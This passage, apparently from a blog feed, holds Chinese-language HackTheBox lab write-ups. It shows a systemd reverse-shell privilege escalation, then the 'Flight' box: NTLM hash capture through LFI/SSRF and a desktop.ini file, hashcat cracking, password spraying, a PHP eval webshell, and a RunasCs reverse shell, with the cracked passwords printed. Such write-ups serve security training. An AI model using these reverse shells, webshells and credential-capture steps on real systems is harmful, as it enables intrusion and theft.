class="code"><pre><span class="line">Matching Defaults entries for svc on encoding:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin,</span><br><span class="line">    use_pty</span><br><span class="line"></span><br><span class="line">User svc may run the following commands on encoding:</span><br><span class="line">    (root) NOPASSWD: &#x2F;usr&#x2F;bin&#x2F;systemctl restart *</span><br></pre></td></tr></table></figure><p>查看路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getfacl /etc/systemd/system</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># file: etc&#x2F;systemd&#x2F;system</span><br><span class="line"># owner: root</span><br><span class="line"># group: root</span><br><span class="line">user::rwx</span><br><span class="line">user:svc:-wx</span><br><span class="line">group::rwx</span><br><span class="line">mask::rwx</span><br><span class="line">other::r-x</span><br></pre></td></tr></table></figure><p>编写service如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Service]</span><br><span class="line">ExecStart&#x3D;&#x2F;bin&#x2F;bash -c &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.10.*.*&#x2F;9996 0&gt;&amp;1&quot;</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy&#x3D;multi-user.target</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9996</span><br></pre></td></tr></table></figure><p>写入service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -n W1NlcnZpY2VdCkV4ZWNTdGFydD0vYmluL2Jhc2ggLWMgImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMi85OTk2IDA+JjEiCgpbSW5zdGFsbF0KV2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQ= | base64 -d &gt; /etc/systemd/system/bufferfly.service</span><br></pre></td></tr></table></figure><p>重启service</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u root /usr/bin/systemctl restart bufferfly</span><br></pre></td></tr></table></figure><p>获取Shell，查看root.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /root/root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffba7f2f7e12fd7fa94a522e00db275e</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Flight</title>
    <link href="https://yoloyolo.top/2023/03/12/HackTheBox-Flight/"/>
    <id>https://yoloyolo.top/2023/03/12/HackTheBox-Flight/</id>
    <published>2023-03-12T05:35:08.000Z</published>
    <updated>2023-03-12T05:42:32.978Z</updated>
    
    <content type="html"><![CDATA[<p>Nice one.</p><a id="more"></a><h1 id="hackthebox_flight"><a class="markdownIt-Anchor" href="#hackthebox_flight"></a> HackTheBox_Flight</h1><h2 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h2><h3 id="端口扫描"><a class="markdownIt-Anchor" href="#端口扫描"></a> 端口扫描</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 1-10000 -sV -T5 -v 10.10.11.187</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report for 10.10.11.187</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 9986 filtered ports</span><br><span class="line">PORT     STATE SERVICE       VERSION</span><br><span class="line">53&#x2F;tcp   open  domain?</span><br><span class="line">80&#x2F;tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL&#x2F;1.1.1m PHP&#x2F;8.1.1)</span><br><span class="line">88&#x2F;tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-09 17:59:10Z)</span><br><span class="line">135&#x2F;tcp  open  msrpc         Microsoft Windows RPC</span><br><span class="line">139&#x2F;tcp  open  netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">389&#x2F;tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">445&#x2F;tcp  open  microsoft-ds?</span><br><span class="line">464&#x2F;tcp  open  kpasswd5?</span><br><span class="line">593&#x2F;tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0</span><br><span class="line">636&#x2F;tcp  open  tcpwrapped</span><br><span class="line">3268&#x2F;tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb0., Site: Default-First-Site-Name)</span><br><span class="line">3269&#x2F;tcp open  tcpwrapped</span><br><span class="line">5985&#x2F;tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP&#x2F;UPnP)</span><br><span class="line">9389&#x2F;tcp open  mc-nmf        .NET Message Framing</span><br><span class="line">1 service unrecognized despite returning data. If you know the service&#x2F;version, please submit the following fingerprint at https:&#x2F;&#x2F;nmap.org&#x2F;cgi-bin&#x2F;submit.cgi?new-service :</span><br><span class="line">SF-Port53-TCP:V&#x3D;7.80%I&#x3D;7%D&#x3D;3&#x2F;9%Time&#x3D;6409BDB7%P&#x3D;x86_64-pc-linux-gnu%r(DNSVe</span><br><span class="line">SF:rsionBindReqTCP,20,&quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\x</span><br><span class="line">SF:04bind\0\0\x10\0\x03&quot;);</span><br><span class="line">Service Info: Host: G0; OS: Windows; CPE: cpe:&#x2F;o:microsoft:windows</span><br></pre></td></tr></table></figure><h3 id="路径枚举"><a class="markdownIt-Anchor" href="#路径枚举"></a> 路径枚举</h3><p>未枚举出路径</p><h3 id="vhost"><a class="markdownIt-Anchor" href="#vhost"></a> VHOST</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.11.187/ | grep htb</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">p</span> <span class="attr">class</span>=<span class="string">&quot;lf&quot;</span>&gt;</span>Copyright 2022 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>flight.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> - All Rights Reserved<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br></pre></td></tr></table></figure><p>得到域名<code>flight.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tflight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><p>枚举VHOST</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wfuzz -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u <span class="string">&quot;http://flight.htb&quot;</span> -H <span class="string">&quot;Host: FUZZ.flight.htb&quot;</span> --hl 154</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">000000624:   200        90 L     412 W      3996 Ch     &quot;school&quot;</span><br></pre></td></tr></table></figure><p>得到域名<code>school.flight.htb</code></p><p>添加域名解析</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;10.10.11.187\tschool.flight.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure><h2 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h2><p>LFI?</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=index.php</span><br></pre></td></tr></table></figure><p>HTML源码中得到index.php代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">error_reporting(E_ERROR | E_WARNING | E_PARSE); </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> ((strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;..&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(strtolower(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>])),<span class="string">&#x27;filter&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;\\&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;htaccess&#x27;</span>)!==<span class="literal">false</span>)||</span><br><span class="line">    (strpos(urldecode(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]),<span class="string">&#x27;.shtml&#x27;</span>)!==<span class="literal">false</span>)</span><br><span class="line">)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;Suspicious Activity Blocked!&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h3&gt;Incident will be reported&lt;/h3&gt;\r\n&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="variable">$_GET</span>[<span class="string">&#x27;view&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;C:\\xampp\\htdocs\\school.flight.htb\\home.html&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>SSRF发起SMB请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://school.flight.htb/index.php?view=//10.10.16.12/BFL</span><br></pre></td></tr></table></figure><p>得到NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">svc_apache::flight:d5bf8d2c6c495f7b:056EEC55DECB7A98AE95A4035C337D4A:010100000000000080156333C353D90175771A5F2C2A58F90000000002000800560050004D00430001001E00570049004E002D003300590036004E00470042005800320052005200370004003400570049004E002D003300590036004E0047004200580032005200520037002E00560050004D0043002E004C004F00430041004C0003001400560050004D0043002E004C004F00430041004C0005001400560050004D0043002E004C004F00430041004C000700080080156333C353D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到密码如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S@Ss!K@*t13</span><br></pre></td></tr></table></figure><p>枚举SMB用户名</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u svc_apache -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] Enumerated domain user(s)</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\O.Possum                       badpwdcount: 2 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\svc_apache                     badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\V.Stevens                      badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\D.Truff                        badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\I.Francis                      badpwdcount: 1 desc: N</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\W.Walker                       badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\C.Bum                          badpwdcount: 0 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\M.Gold                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\L.Kein                         badpwdcount: 1 desc: P</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\G.Lors                         badpwdcount: 1 desc: S</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\R.Cold                         badpwdcount: 1 desc: H</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\S.Moon                         badpwdcount: 0 desc: J</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\krbtgt                         badpwdcount: 0 desc: K</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Guest                          badpwdcount: 0 desc: B</span><br><span class="line">SMB         10.10.11.187    445    G0               flight.htb\Administrator                  badpwdcount: 0 desc: B</span><br></pre></td></tr></table></figure><p>用户名列表如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat users</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">O.Possum</span><br><span class="line">svc_apache</span><br><span class="line">V.Stevens</span><br><span class="line">D.Truff</span><br><span class="line">I.Francis</span><br><span class="line">W.Walker</span><br><span class="line">C.Bum</span><br><span class="line">M.Gold</span><br><span class="line">L.Kein</span><br><span class="line">G.Lors</span><br><span class="line">R.Cold</span><br><span class="line">S.Moon</span><br><span class="line">krbtgt</span><br><span class="line">Guest</span><br><span class="line">Administrator</span><br></pre></td></tr></table></figure><p>测试同密码</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crackmapexec smb 10.10.11.187 -d flight -u ./users -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span> --continue-on-success</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">SMB         10.10.11.187    445    G0               [*] Windows 10.0 Build 17763 x64 (name:G0) (domain:flight) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\O.Possum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\svc_apache:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\V.Stevens:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\D.Truff:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\I.Francis:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\W.Walker:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\C.Bum:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\M.Gold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\L.Kein:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\G.Lors:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\R.Cold:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [+] flight\S.Moon:S@Ss!K@*t13 </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\krbtgt:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Guest:S@Ss!K@*t13 STATUS_LOGON_FAILURE </span><br><span class="line">SMB         10.10.11.187    445    G0               [-] flight\Administrator:S@Ss!K@*t13 STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure><p>密码命中用户<code>S.Moon</code></p><p>查看SMB路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u S.Moon -p <span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445Name: 10.10.11.187</span><br><span class="line">    Disk                                                PermissionsComment</span><br><span class="line">----                                                ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          READ ONLYLogon server share </span><br><span class="line">Shared                                            READ, WRITE</span><br><span class="line">SYSVOL                                            READ ONLYLogon server share </span><br><span class="line">Users                                             READ ONLY</span><br><span class="line">Web                                               READ ONLY</span><br></pre></td></tr></table></figure><p>错误方法</p><p><s>嗨呀，smb分享路径写权限一眼psexec GetShell</s></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python psexec.py flight.htb/S.Moon:<span class="string">&#x27;S@Ss!K@*t13&#x27;</span>@10.10.11.187</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[*] Requesting shares on 10.10.11.187.....</span><br><span class="line">[-] share &#39;ADMIN$&#39; is not writable.</span><br><span class="line">[-] share &#39;C$&#39; is not writable.</span><br><span class="line">[-] share &#39;NETLOGON&#39; is not writable.</span><br><span class="line">[*] Found writable share Shared</span><br><span class="line">[*] Uploading file gpbkeZsf.exe</span><br><span class="line">[-] Error uploading file gpbkeZsf.exe, aborting.....</span><br><span class="line">[-] Error performing the installation, cleaning up: SMB SessionError: STATUS_ACCESS_DENIED(&#123;Access Denied&#125; A process has requested access to an object but has not been granted those access rights.)</span><br></pre></td></tr></table></figure><p><s>What the hell?</s></p><p>正确方法</p><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">responder -I tun0 -A</span><br></pre></td></tr></table></figure><p>利用写权限上传desktop.ini用于触发SMB请求</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat desktop.ini</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[.ShellClassInfo]</span><br><span class="line">IconResource&#x3D;\\10.10.*.*\BFL</span><br></pre></td></tr></table></figure><p>上传desktop.ini</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">smbclient //10.10.11.187/shared -U S.Moon --password=<span class="string">&#x27;S@Ss!K@*t13&#x27;</span></span><br><span class="line">put desktop.ini</span><br></pre></td></tr></table></figure><p>得到NTLMv2如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c.bum::flight.htb:e432c50eb3a75399:595CE71063742D2A3FCC6348F3B5782E:010100000000000000909C42D053D90114DEF6163CCF2D770000000002000800510051004E00460001001E00570049004E002D003800430051004900460035005800510038004C004B0004003400570049004E002D003800430051004900460035005800510038004C004B002E00510051004E0046002E004C004F00430041004C0003001400510051004E0046002E004C004F00430041004C0005001400510051004E0046002E004C004F00430041004C000700080000909C42D053D90106000400020000000800300030000000000000000000000000300000BD05FB1B064E54E1A7E420729E19420E898B09DD065D0296F8674AE7D0FEB3500A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00310032000000000000000000</span><br></pre></td></tr></table></figure><p>hashcat爆破</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 5600 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure><p>得到明文如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Tikkycoll_431012284</span><br></pre></td></tr></table></figure><p>查看SMB路径权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbmap -H 10.10.11.187 -u c.bum -p Tikkycoll_431012284</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[+] IP: 10.10.11.187:445Name: 10.10.11.187</span><br><span class="line">    Disk                                                PermissionsComment</span><br><span class="line">----                                                ------------------</span><br><span class="line">ADMIN$                                            NO ACCESSRemote Admin</span><br><span class="line">C$                                                NO ACCESSDefault share</span><br><span class="line">IPC$                                              READ ONLYRemote IPC</span><br><span class="line">NETLOGON                                          READ ONLYLogon server share </span><br><span class="line">Shared                                            READ, WRITE</span><br><span class="line">SYSVOL                                            READ ONLYLogon server share </span><br><span class="line">Users                                             READ ONLY</span><br><span class="line">Web                                               READ, WRITE</span><br></pre></td></tr></table></figure><p><s>嗨呀，psexec</s></p><p>与之前一样的原因，写入Shared无法反弹Shell<br />本来想试着写入Web的，结果psexec是按顺序尝试写入分享路径，在分享路径Shared尝试失败后就推出了<br />整了半天不知道怎么指定分享路径Web，只能写Webshell了</p><p>Weevely的create_function()不被php8所支持导致Webshell不可用<br />apt-get升级跟github下载项目都不行<br />大概看了一眼issue<br />作者说create_function是在内存中运行的，其他的函数都没有这个效果<br />然后好像就摆烂了？<br />没办法，上蚁剑吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;BFL&quot;]);?&gt;&#x27;</span> &gt; BFL.php</span><br><span class="line">smbclient //10.10.11.187/web -U c.bum --password=Tikkycoll_431012284</span><br><span class="line"><span class="built_in">cd</span> school.flight.htb</span><br><span class="line">put BFL.php</span><br></pre></td></tr></table></figure><p>监听</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvnp 9998</span><br></pre></td></tr></table></figure><blockquote><p><a href="https://github.com/antonioCoco/RunasCs/">https://github.com/antonioCoco/RunasCs/</a></p></blockquote><p>使用蚁剑上传runascs后运行</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runascs.exe c.bum Tikkycoll_431012284 powershell -r <span class="number">10</span>.<span class="number">10</span>.*.*:<span class="number">9998</span></span><br></pre></td></tr></table></figure><p>查看user.txt</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">type</span> /users/c.bum/desktop/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">970e7b5b8f6e538ede217e98f6e33832</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><p>收集系统信息</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systeminfo</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 